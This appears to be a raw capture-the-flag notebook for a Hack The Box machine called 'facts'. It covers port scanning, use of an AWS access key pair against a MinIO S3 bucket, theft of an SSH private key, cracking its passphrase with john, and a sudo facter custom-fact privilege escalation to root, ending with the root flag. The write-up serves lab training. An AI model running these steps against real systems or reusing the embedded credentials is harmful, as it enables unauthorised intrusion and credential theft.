# 
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.3.10 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
 rustscan -a 10.129.3.181 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
 rustscan -a 10.129.5.166 --ulimit 1000 -r 1-65535 -- -A -sC -Pn


.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 1000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.3.10:22
Open 10.129.3.10:80
Open 10.129.3.10:54321
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn" on ip 10.129.3.10
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 16:20 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Initiating SYN Stealth Scan at 16:20
Scanning facts.htb (10.129.3.10) [3 ports]
Discovered open port 54321/tcp on 10.129.3.10
Discovered open port 80/tcp on 10.129.3.10
Discovered open port 22/tcp on 10.129.3.10
Completed SYN Stealth Scan at 16:20, 0.39s elapsed (3 total ports)
Initiating Service scan at 16:21
Scanning 3 services on facts.htb (10.129.3.10)
Completed Service scan at 16:21, 35.01s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against facts.htb (10.129.3.10)
Initiating Traceroute at 16:21
Completed Traceroute at 16:21, 0.35s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:21
Completed Parallel DNS resolution of 1 host. at 16:21, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.129.3.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:21
Completed NSE at 16:21, 6.67s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:21
Completed NSE at 16:21, 1.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:21
Completed NSE at 16:21, 0.00s elapsed
Nmap scan report for facts.htb (10.129.3.10)
Host is up, received user-set (0.22s latency).
Scanned at 2026-02-22 16:20:59 EST for 47s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: facts
|_http-favicon: Unknown favicon MD5: 4BD0A899F9B2DCA706B5B522443705A7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
54321/tcp open  http    syn-ack ttl 62 Golang net/http server
| http-methods: 
|_  Supported Methods: GET OPTIONS
|_http-title: Did not follow redirect to http://facts.htb:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1896AE6B32850D57
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 22 Feb 2026 21:21:18 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>1896AE6B32850D57</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1896AE66ABB5116A
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 22 Feb 2026 21:20:59 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1896AE66ABB5116A</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Sun, 22 Feb 2026 21:21:00 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.95%I=7%D=2/22%Time=699B7342%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAc
SF:cept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20app
SF:lication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-a
SF:ge=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20
SF:dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-A
SF:mz-Request-Id:\x201896AE66ABB5116A\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2022\x20Fe
SF:b\x202026\x2021:20:59\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encod
SF:ing=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x2
SF:0Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Req
SF:uestId>1896AE66ABB5116A</RequestId><HostId>dd9025bab4ad464b049177c95eb6
SF:ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,5
SF:9,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Sun,\x2022\x20
SF:Feb\x202026\x2021:21:00\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x2
SF:0400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2
SF:0303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-
SF:Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\
SF:x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af
SF:9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x201896AE6B32850D57\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\
SF:r\nDate:\x20Sun,\x2022\x20Feb\x202026\x2021:21:18\x20GMT\r\n\r\n<\?xml\
SF:x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReque
SF:st</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Messag
SF:e><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>1896
SF:AE6B32850D57</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3f
SF:d1af9251148b658df7ac2e3e8</HostId></Error>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/22%OT=22%CT=%CU=42722%PV=Y%DS=2%DC=T%G=N%TM=699B736A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11N
OS:W7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Uptime guess: 20.695 days (since Sun Feb  1 23:41:33 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 54321/tcp)
HOP RTT       ADDRESS
1   348.66 ms 10.10.16.1
2   154.22 ms facts.htb (10.129.3.10)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:21
Completed NSE at 16:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:21
Completed NSE at 16:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:21
Completed NSE at 16:21, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.41 seconds
           Raw packets sent: 35 (2.350KB) | Rcvd: 20 (1.578KB)


┌──(kali㉿kali)-[~]
└─$ 


![[Pasted image 20260223005512.png]]

![[Pasted image 20260223005537.png]]



┌──(kali㉿kali)-[~]
└─$ aws configure --profile facts
AWS Access Key ID [None]: AKIA85A3A434838655B1
AWS Secret Access Key [None]: qUp/sOmBHfAh5MZHmyY7hcxg3ONgRgkRwgz4+ga1
Default region name [None]: randomfacts
Default output format [None]: http://localhost:54321

┌──(kali㉿kali)-[~]
└─$ aws configure --profile facts
AWS Access Key ID [****************55B1]: AKIA85A3A434838655B1
AWS Secret Access Key [****************+ga1]: qUp/sOmBHfAh5MZHmyY7hcxg3ONgRgkRwgz4+ga1
Default region name [randomfacts]: us-east-1
Default output format [http://localhost:54321]: json

┌──(kali㉿kali)-[~]
└─$ aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts


┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://internal --endpoint-url http://facts.htb:54321 --profile facts
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile

┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://internal/.ssh --endpoint-url http://facts.htb:54321 --profile facts
                           PRE .ssh/

┌──(kali㉿kali)-[~]
└─$ aws s3 sync s3://internal/.ssh ./ssh_loot --endpoint-url http://facts.htb:54321 --profile facts

download: s3://internal/.ssh/id_ed25519 to ssh_loot/id_ed25519      
download: s3://internal/.ssh/authorized_keys to ssh_loot/authorized_keys


python3 /usr/share/john/ssh2john.py ~/ssh_loot/id_ed25519 > key.john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.john
```


┌──(kali㉿kali)-[~]
└─$ sudo ssh-keygen -y -f ~/ssh_loot/id_ed25519 -P "dragonballz"

[sudo] password for kali: 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAu09u4iEamLaZJlOWqpIYy00Oz0wtlxLN9a+9xQfvr trivia@facts.htb

trivia@facts:/home/william$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

```
See 'snap info <snapname>' for additional versions.
```
trivia@facts:/home/william$ nano pwn.rb
trivia@facts:/home/william$ # 
```
mkdir -p /tmp/facts
cat > /tmp/facts/pwn.rb << 'EOF'
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
EOF
```

sudo /usr/bin/facter --custom-dir /tmp/facts
root@facts:/home/william# cd /root
root@facts:~# ls
minio-binaries  ministack  root.txt  snap
root@facts:~# cat root.txt 
ecc8c5920595340bc71780c4




---
another machine 

```
dirsearch -u http://monitorsfour.htb -x 404
```